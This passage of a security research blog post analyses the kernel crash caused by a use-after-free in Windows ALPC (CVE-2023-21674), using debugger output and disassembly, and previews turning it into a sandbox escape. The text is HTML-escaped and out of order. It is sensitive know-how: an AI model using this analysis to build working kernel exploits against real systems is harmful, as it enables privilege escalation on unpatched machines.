+ffffc182`d4b56570 fffff803`&lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;de42329     : ffffffff`ffffffff &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;00000002&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt; : nt!MmAccessFault+&lt;span class=&#34;hljs-number&#34;&gt;0x29c&lt;/span&gt;
+ffffc182`d4b56690 fffff803`&lt;span class=&#34;hljs-number&#34;&gt;7e0&lt;/span&gt;fcf6c     : ffffa307`cb0b0ce0 &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;00000008&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt; ffff900d`&lt;span class=&#34;hljs-number&#34;&gt;72&lt;/span&gt;a48f80 : nt!KiPageFault+&lt;span class=&#34;hljs-number&#34;&gt;0x369&lt;/span&gt;
+ffffc182`d4b56820 fffff803`&lt;span class=&#34;hljs-number&#34;&gt;7e0&lt;/span&gt;fc09b     : ffffffff`&lt;span class=&#34;hljs-number&#34;&gt;00000001&lt;/span&gt; ffff900d`c9466e20 &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;00010000&lt;/span&gt; ffffffff`ffffffff : nt!AlpcpCancelMessage+&lt;span class=&#34;hljs-number&#34;&gt;0x358&lt;/span&gt;
+ffffc182`d4b568a0 fffff803`&lt;span class=&#34;hljs-number&#34;&gt;7e0&lt;/span&gt;fbdef     : ffffffff`ffffffff ffff900d`c9466e20 ffff900d`c9466f80 ffff900d`c9466e20 : nt!AlpcpFlushQueue+&lt;span class=&#34;hljs-number&#34;&gt;0x117&lt;/span&gt;
+ffffc182`d4b568e0 fffff803`&lt;span class=&#34;hljs-number&#34;&gt;7e0&lt;/span&gt;fc24f     : ffffffff`ffffffff ffffffff`ffffffff ffffc182`d4b56a49 ffff900d`c9466e20 : nt!AlpcpFlushMessagesPort+&lt;span class=&#34;hljs-number&#34;&gt;0x27&lt;/span&gt;
+ffffc182`d4b56920 fffff803`&lt;span class=&#34;hljs-number&#34;&gt;7e0&lt;/span&gt;fc97b     : ffff900d`c9466e20 &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;00000001&lt;/span&gt; ffff900d`&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;cdeef20 &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;00040286&lt;/span&gt; : nt!AlpcpDoPortCleanup+&lt;span class=&#34;hljs-number&#34;&gt;0x8f&lt;/span&gt;
+ffffc182`d4b56960 fffff803`&lt;span class=&#34;hljs-number&#34;&gt;7e0&lt;/span&gt;cae78     : &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;00000001&lt;/span&gt; ffffc182`&lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;0000052&lt;/span&gt;c ffffffff`ffffffff : nt!AlpcpClosePort+&lt;span class=&#34;hljs-number&#34;&gt;0x4b&lt;/span&gt;
+ffffc182`d4b56990 fffff803`&lt;span class=&#34;hljs-number&#34;&gt;7e0&lt;/span&gt;c85a9     : &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;00000544&lt;/span&gt; ffffc182`d4b56a00 &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;0000052&lt;/span&gt;c ffffa307`&lt;span class=&#34;hljs-number&#34;&gt;00000002&lt;/span&gt; : nt!ObpCloseHandle+&lt;span class=&#34;hljs-number&#34;&gt;0x298&lt;/span&gt;
+ffffc182`d4b56ab0 fffff803`&lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;de464e5     : ffff900d`c22be600 ffff900d`c22be600 ffffffff`e8287c00 ffff900d`&lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt; : nt!NtClose+&lt;span class=&#34;hljs-number&#34;&gt;0x39&lt;/span&gt;
+ffffc182`d4b56ae0 &lt;span class=&#34;hljs-number&#34;&gt;00007f&lt;/span&gt;ff`&lt;span class=&#34;hljs-number&#34;&gt;9&lt;/span&gt;a12efe4     : &lt;span class=&#34;hljs-number&#34;&gt;000001&lt;/span&gt;a9`c18c1352 &lt;span class=&#34;hljs-number&#34;&gt;00007f&lt;/span&gt;ff`&lt;span class=&#34;hljs-number&#34;&gt;9&lt;/span&gt;a12f850 &lt;span class=&#34;hljs-number&#34;&gt;00007f&lt;/span&gt;ff`&lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt; ffffffff`e8287c00 : nt!KiSystemServiceCopyEnd+&lt;span class=&#34;hljs-number&#34;&gt;0x25&lt;/span&gt;
+&lt;span class=&#34;hljs-number&#34;&gt;0000006&lt;/span&gt;d`&lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;d3fb718 &lt;span class=&#34;hljs-number&#34;&gt;000001&lt;/span&gt;a9`c18c1352     : &lt;span class=&#34;hljs-number&#34;&gt;00007f&lt;/span&gt;ff`&lt;span class=&#34;hljs-number&#34;&gt;9&lt;/span&gt;a12f850 &lt;span class=&#34;hljs-number&#34;&gt;00007f&lt;/span&gt;ff`&lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt; ffffffff`e8287c00 &lt;span class=&#34;hljs-number&#34;&gt;00007f&lt;/span&gt;ff`&lt;span class=&#34;hljs-number&#34;&gt;99208960&lt;/span&gt; : ntdll!NtClose+&lt;span class=&#34;hljs-number&#34;&gt;0x14&lt;/span&gt;
+&lt;span class=&#34;hljs-number&#34;&gt;0000006&lt;/span&gt;d`&lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;d3fb720 &lt;span class=&#34;hljs-number&#34;&gt;00007f&lt;/span&gt;ff`&lt;span class=&#34;hljs-number&#34;&gt;9&lt;/span&gt;a12f84f     : &lt;span class=&#34;hljs-number&#34;&gt;00007f&lt;/span&gt;ff`&lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt; ffffffff`e8287c00 &lt;span class=&#34;hljs-number&#34;&gt;00007f&lt;/span&gt;ff`&lt;span class=&#34;hljs-number&#34;&gt;99208960&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt; : &lt;span class=&#34;hljs-number&#34;&gt;0x000001a9&lt;/span&gt;`c18c1352
+&lt;span class=&#34;hljs-number&#34;&gt;0000006&lt;/span&gt;d`&lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;d3fb728 &lt;span class=&#34;hljs-number&#34;&gt;00007f&lt;/span&gt;ff`&lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;     : ffffffff`e8287c00 &lt;span class=&#34;hljs-number&#34;&gt;00007f&lt;/span&gt;ff`&lt;span class=&#34;hljs-number&#34;&gt;99208960&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt; : ntdll!NtResumeThread+&lt;span class=&#34;hljs-number&#34;&gt;0x1f&lt;/span&gt;
+&lt;span class=&#34;hljs-number&#34;&gt;0000006&lt;/span&gt;d`&lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;d3fb730 ffffffff`e8287c00     : &lt;span class=&#34;hljs-number&#34;&gt;00007f&lt;/span&gt;ff`&lt;span class=&#34;hljs-number&#34;&gt;99208960&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt; : &lt;span class=&#34;hljs-number&#34;&gt;0x00007fff&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;
+&lt;span class=&#34;hljs-number&#34;&gt;0000006&lt;/span&gt;d`&lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;d3fb738 &lt;span class=&#34;hljs-number&#34;&gt;00007f&lt;/span&gt;ff`&lt;span class=&#34;hljs-number&#34;&gt;99208960&lt;/span&gt;     : &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;00007f&lt;/span&gt;ff`&lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt; : &lt;span class=&#34;hljs-number&#34;&gt;0xffffffff&lt;/span&gt;`e8287c00
+&lt;span class=&#34;hljs-number&#34;&gt;0000006&lt;/span&gt;d`&lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;d3fb740 &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;     : &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;00007f&lt;/span&gt;ff`&lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;`&lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt; : KERNEL32!SleepStub
+
+SYMBOL_NAME:  nt!AlpcpCancelMessage+&lt;span class=&#34;hljs-number&#34;&gt;358&lt;/span&gt;
+
+MODULE_NAME:ntIMAGE_NAME:  ntkrnlmp.exe
+
+STACK_COMMAND:.process /r /p &lt;span class=&#34;hljs-number&#34;&gt;0xffff900dc2556240&lt;/span&gt;; .thread /r /p &lt;span class=&#34;hljs-number&#34;&gt;0xffff900dc22be600&lt;/span&gt; ; kbBUCKET_ID_FUNC_OFFSET:  &lt;span class=&#34;hljs-number&#34;&gt;358&lt;/span&gt;
+
+FAILURE_BUCKET_ID:  AV_VRFK_nt!AlpcpCancelMessage
+
+OS_VERSION:  &lt;span class=&#34;hljs-number&#34;&gt;10.0&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;.22621&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;.1&lt;/span&gt;
+
+BUILDLAB_STR:  ni_release
+
+OSPLATFORM_TYPE:  x64
+
+OSNAME:  Windows &lt;span class=&#34;hljs-number&#34;&gt;10&lt;/span&gt;
+
+FAILURE_ID_HASH:  {b76e5108-ed87-f585&lt;span class=&#34;hljs-number&#34;&gt;-7&lt;/span&gt;c9b&lt;span class=&#34;hljs-number&#34;&gt;-99750f&lt;/span&gt;572740}
+
+Followup:     MachineOwner&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Cracking the dump open in &lt;code&gt;kd&lt;/code&gt; after the BSOD, the STOP code is &lt;code&gt;PAGE_FAULT_IN_NONPAGED_AREA (0x50)&lt;/code&gt;, the faulting IP is &lt;code&gt;nt!AlpcpCancelMessage + 0x358&lt;/code&gt;, and the faulting instruction is &lt;code&gt;xchg qword ptr [reg+578h], reg2&lt;/code&gt;. Exactly where we predicted! But &lt;code&gt;!analyze -v&lt;/code&gt; only tells us &amp;#x201C;it died here,&amp;#x201D; not &amp;#x201C;why it &lt;em&gt;had&lt;/em&gt; to die here&amp;#x201D;&amp;#x2026; so let&amp;#x2019;s rewind to the actual register state at the moment of the fault!&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs cpp&#34;&gt;&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;: kd&amp;gt; .process /r /p &lt;span class=&#34;hljs-number&#34;&gt;0xffff900dc2556240&lt;/span&gt;
+&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;: kd&amp;gt; .thread /r /p &lt;span class=&#34;hljs-number&#34;&gt;0xffff900dc22be600&lt;/span&gt;
+&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;: kd&amp;gt; .frame /r &lt;span class=&#34;hljs-number&#34;&gt;7&lt;/span&gt;
+&lt;span class=&#34;hljs-number&#34;&gt;07&lt;/span&gt; ffffc182d4b56820 fffff8037e0fc09b     nt!AlpcpCancelMessage+&lt;span class=&#34;hljs-number&#34;&gt;0x358&lt;/span&gt;
+rax=&lt;span class=&#34;hljs-number&#34;&gt;0000000000000000&lt;/span&gt; rbx=ffffa307cb0b0ce0 rcx=ffff900dcddce600
+rdx=&lt;span class=&#34;hljs-number&#34;&gt;000000006b&lt;/span&gt;577350 rsi=&lt;span class=&#34;hljs-number&#34;&gt;0000000000000000&lt;/span&gt; rdi=&lt;span class=&#34;hljs-number&#34;&gt;0000000000000000&lt;/span&gt;
+rip=fffff8037e0fcf6c rsp=ffffc182d4b56820 rbp=&lt;span class=&#34;hljs-number&#34;&gt;0000000000000001&lt;/span&gt;
+r8=&lt;span class=&#34;hljs-number&#34;&gt;0000000000000000&lt;/span&gt;  r9=&lt;span class=&#34;hljs-number&#34;&gt;7f&lt;/span&gt;fffffffffffffc r10=&lt;span class=&#34;hljs-number&#34;&gt;0000000000000000&lt;/span&gt;
+r13=&lt;span class=&#34;hljs-number&#34;&gt;0000000000000000&lt;/span&gt;  r14=ffff900dc9466e20 r15=&lt;span class=&#34;hljs-number&#34;&gt;0000000000000001&lt;/span&gt;
+nt!AlpcpCancelMessage+&lt;span class=&#34;hljs-number&#34;&gt;0x358&lt;/span&gt;:
+fffff803`&lt;span class=&#34;hljs-number&#34;&gt;7e0&lt;/span&gt;fcf6c &lt;span class=&#34;hljs-number&#34;&gt;48878178050000&lt;/span&gt;  xchg    rax,qword ptr [rcx+&lt;span class=&#34;hljs-number&#34;&gt;578&lt;/span&gt;h]&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;code&gt;.frame /r 7&lt;/code&gt; restores the register context all the way down to stack frame 7 (&lt;code&gt;AlpcpCancelMessage&lt;/code&gt;). Right after a raw &lt;code&gt;!analyze -v&lt;/code&gt;, kd is parked at &lt;code&gt;DbgBreakPointWithStatus&lt;/code&gt;, and whatever &lt;code&gt;r&lt;/code&gt; prints reflects &amp;#x201C;wherever the debugger is stopped,&amp;#x201D; not the values from the moment the kernel died. This command turns the clock back.&lt;/p&gt;
+&lt;p&gt;Of the rolled-back values, here are the ones we care about:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;rip = nt!AlpcpCancelMessage+0x358 &amp;#x2014; that exact xchg&lt;/li&gt;
+&lt;li&gt;rcx = ffff900dcddce600 &amp;#x2014; the dangling pointer&lt;/li&gt;
+&lt;li&gt;rax = 0, r13 = 0 &amp;#x2014; the value being written (just 0)&lt;/li&gt;
+&lt;li&gt;rbx = ffffa307cb0b0ce0 &amp;#x2014; the msg we&amp;#x2019;re currently iterating on&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Now if we just peel back a few instructions around the xchg, the picture of why it died right here comes into focus!!&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs cpp&#34;&gt;&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;: kd&amp;gt; u nt!AlpcpCancelMessage+&lt;span class=&#34;hljs-number&#34;&gt;0x340&lt;/span&gt; L10
++&lt;span class=&#34;hljs-number&#34;&gt;0x340&lt;/span&gt;   call nt!PsReleaseProcessWakeCounter    ; other cleanup work
++&lt;span class=&#34;hljs-number&#34;&gt;0x349&lt;/span&gt;   mov  [rbx+&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;D8h], r13                    ; msg[+&lt;span class=&#34;hljs-number&#34;&gt;0xD8&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; (flag stuff)
++&lt;span class=&#34;hljs-number&#34;&gt;0x350&lt;/span&gt;   mov  rcx, [rbx+&lt;span class=&#34;hljs-number&#34;&gt;20&lt;/span&gt;h]                     ; load msg[+&lt;span class=&#34;hljs-number&#34;&gt;0x20&lt;/span&gt;] into rcx
++&lt;span class=&#34;hljs-number&#34;&gt;0x354&lt;/span&gt;   test rcx, rcx                           ;   &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt; check
++&lt;span class=&#34;hljs-number&#34;&gt;0x357&lt;/span&gt;   je   +&lt;span class=&#34;hljs-number&#34;&gt;0x3c9&lt;/span&gt;                             ;   &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;, skip &lt;span class=&#34;hljs-keyword&#34;&gt;this&lt;/span&gt; logic
++&lt;span class=&#34;hljs-number&#34;&gt;0x359&lt;/span&gt;   mov  rax, r13                           ; rax = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; (value to erase with)
++&lt;span class=&#34;hljs-number&#34;&gt;0x35C&lt;/span&gt;   xchg rax, [rcx+&lt;span class=&#34;hljs-number&#34;&gt;578&lt;/span&gt;h]                    ; atomic-write &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; into +&lt;span class=&#34;hljs-number&#34;&gt;0x578&lt;/span&gt; of what rcx points to
++&lt;span class=&#34;hljs-number&#34;&gt;0x363&lt;/span&gt;   cmp  rax, rbx                           ; check &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; the previous value was our msg pointer&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Pull out some kernel-object pointer stored at offset 0x20 of msg, then atomically write 0 into that object&amp;#x2019;s +0x578 field. As the Part 2 kernel RE spelled out, &lt;code&gt;msg[+0x20]&lt;/code&gt; is exactly the WaitingThread field &amp;#x2014; the pressure point of our UAF. &lt;code&gt;AlpcpDispatchNewMessage&lt;/code&gt; plants the trigger thread&amp;#x2019;s &lt;code&gt;_ETHREAD&lt;/code&gt; pointer into this field at send time, and 40 seconds later, when we close the handle, port cleanup dereferences this field again to try to clean up the pending state&amp;#x2026; but? That thread is already dead and its &lt;code&gt;_ETHREAD&lt;/code&gt; itself has been freed!&lt;/p&gt;
+&lt;p&gt;But honestly &amp;#x2014; this BSOD is only circumstantial evidence that the &amp;#x201C;UAF actually stepped on a dangling pointer&amp;#x201D;; it is not a complete Sandbox Escape yet! &amp;#x1F643; For the exploit to work, that pointer left in &lt;code&gt;msg+0x20&lt;/code&gt; can&amp;#x2019;t be pointing at just any random page &amp;#x2014; we need to &lt;strong&gt;reclaim&lt;/strong&gt; the slab so it points at a &lt;strong&gt;live &lt;code&gt;_ETHREAD&lt;/code&gt; that we control&lt;/strong&gt;. Right now we&amp;#x2019;re basically just faceplanting on top of the dangling.&lt;/p&gt;
+&lt;p&gt;Tai Lung got his feather and the chains came off, but there&amp;#x2019;s still a long road ahead before he can go find Master Shifu &amp;#x2014; that&amp;#x2019;s where we are!!&lt;/p&gt;
+&lt;h1 id=&#34;4-Outro-So-how-do-you-actually-exploit-this-Step-6-preview&#34;&gt;&lt;a href=&#34;#4-Outro-So-how-do-you-actually-exploit-this-Step-6-preview&#34; class=&#34;headerlink&#34; title=&#34;4. Outro: So how do you actually exploit this? (Step 6 preview)&#34;&gt;&lt;/a&gt;4. Outro: So how do you actually exploit this? (Step 6 preview)&lt;/h1&gt;&lt;p&gt;You made it &amp;#x2014; nice work! But as you may have noticed, everything we did up to here was really just me taking Theori&amp;#x2019;s original write-up and padding it with stuff I dug up on my own. The genuinely fun part starts now, haha&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2026/07/19/gongjae/Wipeload_step5/EN/image14.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Even Theori itself basically just says &amp;#x201C;use file pickers and you can chain this all the way to Medium code execution&amp;#x201D; and leaves it at that.. as for the actual details? Silence. &amp;#x1F602; &lt;del&gt;But there&amp;#x2019;s no way I&amp;#x2019;m gonna give up on that&lt;/del&gt;&lt;/p&gt;
+&lt;p&gt;How this UAF gets us a &lt;strong&gt;Read/Write primitive&lt;/strong&gt;, and how that primitive gets us to &lt;strong&gt;Medium-privilege code execution&lt;/strong&gt; &amp;#x2014; i.e. how, holding OUYA77&amp;#x2019;s &amp;#x201C;feather for Tai Lung,&amp;#x201D; we break out of the prison cell and go find Master Shifu &amp;#x2014; continues in the next &lt;strong&gt;Step 6&lt;/strong&gt;!&lt;/p&gt;
+&lt;p&gt;See you in the next one~ &amp;#x1F44B;&lt;/p&gt;
+&lt;h1 id=&#34;Reference&#34;&gt;&lt;a href=&#34;#Reference&#34; class=&#34;headerlink&#34; title=&#34;Reference.&#34;&gt;&lt;/a&gt;Reference.&lt;/h1&gt;&lt;p&gt;&lt;a href=&#34;https://github.com/hd3s5aa/CVE-2023-21674/blob/main/CVE-2023-21674.cpp&#34;&gt;https://github.com/hd3s5aa/CVE-2023-21674/blob/main/CVE-2023-21674.cpp&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://theori.io/blog/chaining-n-days-to-compromise-all-part-2-windows-kernel-lpe-a-k-a-chrome-sandbox-escape&#34;&gt;https://theori.io/blog/chaining-n-days-to-compromise-all-part-2-windows-kernel-lpe-a-k-a-chrome-sandbox-escape&lt;/a&gt;&lt;/p&gt;
+ - hack &amp; life">
+  <meta property="og:image" content="https://hackyboiz.github.io/2026/07/19/gongjae/Wipeload_step5/KR/image.png">
+  <meta property="og:url" content="https://hackyboiz.github.io/">
+
+  <link rel="canonical" href="https://hackyboiz.github.io/2026/07/19/gongjae/wipeload_step5/en/">
+
+  <title>[Wipeload Step 5.] Sorry, I studied ALPC just to show you this (EN) - hackyboiz</title>
+
+  <link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">
+
+
+  <link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css">
+  <link rel="stylesheet" href="/lib/hint/hint.min.css">
+
+  
+    
+    <link rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/github-gist.min.css">
+  
+
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_6peoq002giu.css">
+<link rel="stylesheet" href="/.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_pjno9b9zyxs.css">
+<link rel="stylesheet" href="/.css">
+
+
+<link rel="stylesheet" href="/css/main.css">
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script src="/js/utils.js"></script>
+  <script src="/js/color-schema.js"></script>
+
+<meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/rss2.xml" title="hackyboiz" type="application/rss+xml">
+</head>
+
+
+<body>
+  <header style="height: 40vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">&nbsp;<strong>Hackyboiz</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-addrcard"></i>
+                About
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/author/">
+                <i class="iconfont icon-user-fill"></i>
+                Author
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax="true" style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="container page-header text-center fade-in-up">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              
+  <div class="mt-3 post-meta">
+    <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+    <time datetime="2026-07-19 22:00" pubdate>
+      2026년 7월 19일 오후
+    </time>
+  </div>
+
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      5.2k 자
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      103
+       분
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2">
+      <!--<script data-ad-client="ca-pub-3672652207808168" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>-->
+    </div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto" id="post">
+            <!-- SEO header -->
+            <h1 style="display: none">[Wipeload Step 5.] Sorry, I studied ALPC just to show you this (EN)</h1>
+                       
+            <div class="markdown-body" id="post-body">
+              <!-- <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>-->
+              <!-- hackyboiz_horizen_index -->
+              <!--
+              <ins class="adsbygoogle"
+                   style="display:block"
+                   data-ad-client="ca-pub-3672652207808168"
+                   data-ad-slot="8887862313"
+                   data-ad-format="auto"
+                   data-full-width-responsive="true"></ins>
+              <script>
+                   (adsbygoogle = window.adsbygoogle || []).push({});
+              </script>
+              -->
+              <p>Hi everyone! Today gongjae is back with Step 5 &#x2014; the crown jewel of the Wipeload project, haha.</p>
+<p><img src="/2026/07/19/gongjae/Wipeload_step5/EN/image.png" srcset="/img/loading.gif" alt="image"></p>
+<blockquote>
+<p>Previous research posts<br><a href="https://hackyboiz.github.io/2026/06/06/OUYA77/Wipeload_step1/en/">https://hackyboiz.github.io/2026/06/06/OUYA77/Wipeload_step1/en/</a><br><a href="https://hackyboiz.github.io/2026/06/21/ji9umi/Wipeload_step2/en/">https://hackyboiz.github.io/2026/06/21/ji9umi/Wipeload_step2/en/</a><br><a href="https://hackyboiz.github.io/2026/06/26/ji9umi/Wipeload_step3/en/">https://hackyboiz.github.io/2026/06/26/ji9umi/Wipeload_step3/en/</a><br><a href="https://hackyboiz.github.io/2026/07/13/OUYA77/Wipeload_step4/en/">https://hackyboiz.github.io/2026/07/13/OUYA77/Wipeload_step4/en/</a></p>
+</blockquote>
